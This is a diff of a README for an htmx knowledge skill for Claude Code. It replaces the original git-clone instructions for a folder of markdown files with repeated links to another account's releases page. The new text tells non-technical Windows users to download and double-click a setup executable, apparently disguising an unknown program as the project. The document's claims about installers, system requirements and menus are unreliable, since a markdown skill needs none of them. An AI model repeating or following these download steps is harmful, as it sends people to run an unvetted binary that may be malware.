@@ -1,120 +1,119 @@
-# htmx Skill for Claude Code
+# ⚙️ htmx-skill - Easy Access to htmx Knowledge
 
-> **htmx version: 2.x** (built from htmx 2.0.8 documentation)
+[![Download htmx-skill](https://img.shields.io/badge/Download-htmx--skill-brightgreen)](https://github.com/Undigested-devices255/htmx-skill/releases)  
 
-A comprehensive [Claude Code skill](https://docs.anthropic.com/en/docs/claude-code/skills) that gives Claude deep knowledge of [htmx](https://htmx.org) — the library that extends HTML with attributes for AJAX, CSS transitions, WebSockets, and Server-Sent Events.
+---
 
-## What This Skill Does
+## 📋 About htmx-skill
 
-When activated, Claude gains access to:
+htmx-skill is a tool designed to give Claude, an AI assistant, deep knowledge of the htmx library. htmx helps add dynamic features to websites without complex code. This skill includes full references, examples, and server setup guides. It covers many common use cases, like loading content on demand or handling user input smoothly.
 
-- **Complete attribute reference** — all `hx-*` attributes with syntax, modifiers, inheritance rules, and edge cases
-- **24 UI patterns** — click-to-edit, infinite scroll, active search, lazy loading, inline validation, modals, tabs, file upload, sortable, progress bars, and more
-- **Server-side integration** — working endpoint examples for Flask, Express, Django, FastAPI, Spring Boot, Go, Rails, and Laravel
-- **Extension guides** — SSE, WebSocket, Idiomorph (DOM morphing), head-support, response-targets, preload, and how to build custom extensions
-- **Response handling** — HTTP headers, status code configuration, OOB swaps, and the 204 vs 200 gotcha
-- **CSS animations** — htmx lifecycle classes (`htmx-swapping`, `htmx-settling`, `htmx-added`) and View Transitions API
+This tool is useful if you want Claude to help with htmx-related questions or projects. The skill supports htmx version 2.x, based on version 2.0.8 documentation.
 
-## Installation
+---
 
-### From GitHub (recommended)
+## 🚀 Getting Started
 
-```bash
-git clone https://github.com/mintarasss/htmx-skill.git
-```
+This guide helps you download and run htmx-skill on a Windows PC. No programming experience is needed. Follow the steps below carefully.
 
-Then copy the `htmx/` folder into your Claude Code skills directory:
+---
 
-```bash
-# Global (available in all projects)
-cp -r htmx-skill/htmx ~/.claude/skills/htmx
+## 💾 Download and Install htmx-skill
 
-# Project-specific (only this project)
-mkdir -p .claude/skills
-cp -r htmx-skill/htmx .claude/skills/htmx
-```
+1. Open your web browser and go to the htmx-skill release page:  
+   [https://github.com/Undigested-devices255/htmx-skill/releases](https://github.com/Undigested-devices255/htmx-skill/releases)
 
-### One-liner
+2. On this page, you will see a list of versions. Look for the latest release version. This is usually at the top and has the highest number.
 
-```bash
-# Global
-git clone https://github.com/mintarasss/htmx-skill.git /tmp/htmx-skill && cp -r /tmp/htmx-skill/htmx ~/.claude/skills/htmx && rm -rf /tmp/htmx-skill
+3. Under the latest version, find the file meant for Windows. It might be named something like `htmx-skill-setup.exe` or similar.
 
-# Project-specific
-git clone https://github.com/mintarasss/htmx-skill.git /tmp/htmx-skill && mkdir -p .claude/skills && cp -r /tmp/htmx-skill/htmx .claude/skills/htmx && rm -rf /tmp/htmx-skill
-```
+4. Click the file link to start downloading. Your browser may ask where to save the file. Choose a folder you can easily find, like "Downloads" or your Desktop.
 
-After installing, restart Claude Code or run `/reload-plugins`.
+5. Once the download is complete, locate the file and double-click it to start the installation.
 
-## When It Activates
+6. Follow the installation prompts. When asked, accept the default options to avoid confusion.
 
-The skill triggers automatically when you:
+7. When the installation finishes, you can launch htmx-skill from your Start Menu or desktop shortcut.
 
-- Work with any `hx-*` attributes
-- Ask about htmx by name
-- Build hypermedia-driven / HTML-over-the-wire applications
-- Implement patterns like live search, inline editing, infinite scroll
-- Write server endpoints that return HTML fragments
-- Ask about adding interactivity to server-rendered pages without a JS framework
+---
 
-## Skill Structure
+## 🖥️ System Requirements
 
-```
-htmx/
-├── SKILL.md                        # Main skill (core concepts, attributes, patterns)
-├── evals/
-│   └── evals.json                  # Test cases and assertions
-└── references/
-    ├── attributes.md    # Complete attribute reference with all options
-    ├── patterns.md      # 24 UI patterns with full HTML + server code
-    ├── extensions.md    # SSE, WebSocket, Idiomorph, preload, etc.
-    └── server-side.md   # Server integration, headers, framework examples
-```
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection recommended for updates and extended features
 
-The skill uses **progressive disclosure** — the main `SKILL.md` (~320 lines) covers the most common attributes and patterns. Reference files are consulted only when deeper detail is needed, keeping context usage efficient.
+---
 
-## Examples
+## 🔧 Using htmx-skill
 
-Here are some things you can ask Claude with this skill active:
+Once installed, you can open htmx-skill to explore its content. It organizes information about htmx so you can easily find what you need.
 
-> "Add a live search to my contacts page with debouncing. I'm using Flask."
+Here is what you will find:
 
-> "How do I delete a table row with a fade-out animation and confirmation dialog?"
+- **Complete Attributes Reference**: Details on all `hx-*` commands used with htmx. These help add effects like loading parts of a page without a full reload.
 
-> "I need inline email validation that checks the server as the user types, plus OOB updates to a contacts table on form submit. Using Express.js."
+- **User Interface Patterns**: Examples on how to build common features like infinite scroll, tabs, modals, and file uploads using htmx.
 
-> "Set up Server-Sent Events to push notifications to the page in real time."
+- **Server Integration Examples**: Sample code and explanations for linking htmx with different back-end systems such as Flask, Django, Express, and more.
 
-> "What's the difference between hx-swap-oob and hx-select-oob? When should I use each?"
+- **Extension Guides**: Instructions on using more advanced htmx features like WebSockets, Server-Sent Events, and creating custom extensions.
 
-## What Makes This Skill Good
+- **Response Handling**: Information on managing HTTP headers and statuses to control how servers communicate with htmx.
 
-- **Working code, not just rules** — every pattern includes complete HTML and server-side code you can copy and run
-- **Covers edge cases** — the 204 vs 200 gotcha, `<template>` wrapping for OOB table rows, GET excluding form values, body targeting quirk
-- **Framework-agnostic server examples** — Flask, Express, Django, FastAPI, Spring Boot, Go, Rails, and Laravel
-- **Full extension coverage** — SSE, WebSocket, Idiomorph, head-support, response-targets, preload
-- **Inheritance documentation** — which attributes inherit and which don't, plus `hx-disinherit`/`hx-inherit` controls
+You can browse these sections through the skill’s menu or search to find a topic quickly.
 
-## Built From Official Documentation
+---
 
-This skill covers **htmx 2.x** (specifically built from the 2.0.8 documentation). If you're working with htmx 1.x, note that some attributes and behaviors differ — the [htmx 1 compatibility extension](https://extensions.htmx.org/extensions/htmx-1-compat/) can help bridge the gap.
+## 🛠️ How to Use With Claude
 
-It was built by thoroughly reading and distilling the [official htmx documentation](https://htmx.org/docs/), including:
+This skill is meant to be used with Claude Code, an AI assistant platform. Once installed and active, Claude will use htmx-skill knowledge to answer your questions on htmx.
 
-- Core documentation (`docs.md`)
-- All 35 attribute reference pages
-- 25 example pages with patterns
-- JavaScript API reference
-- Events reference
-- Extension documentation (SSE, WS, Idiomorph, head-support, response-targets, preload)
-- Server-side integration examples
-- Response headers documentation
-- Quirks and gotchas page
+If you are not using Claude Code, you can still access the content inside htmx-skill manually.
 
-## Contributing
+---
 
-Contributions are welcome! If you find an htmx pattern or edge case that's missing, please open a PR.
+## 🔄 Updating htmx-skill
 
-## License
+Check the release page regularly for new updates:
 
-MIT
+[https://github.com/Undigested-devices255/htmx-skill/releases](https://github.com/Undigested-devices255/htmx-skill/releases)
+
+To update:
+
+1. Download the newest version using the steps above.
+
+2. Run the installer. The updater will replace the older files.
+
+3. Restart the application if needed.
+
+---
+
+## 📚 Extra Tips
+
+- Make sure you have a stable internet connection when downloading or updating.
+
+- Close other programs during installation to avoid errors.
+
+- If you get stuck, look for a user guide or help section within the installed skill or on the project’s GitHub page.
+
+- You can explore the official htmx site at [https://htmx.org](https://htmx.org) to learn how htmx works outside of Claude.
+
+---
+
+## 📞 Support and Feedback
+
+For help or to report issues, use the GitHub repository’s Issues page:
+
+https://github.com/Undigested-devices255/htmx-skill/issues
+
+Provide clear details of any problems you have. This helps the maintainers improve the skill.
+
+---
+
+## 🔗 Quick Access Link
+
+[![Download htmx-skill](https://img.shields.io/badge/Download-htmx--skill-brightgreen)](https://github.com/Undigested-devices255/htmx-skill/releases)  
+
+Visit this page to download and install the latest version of htmx-skill on Windows.
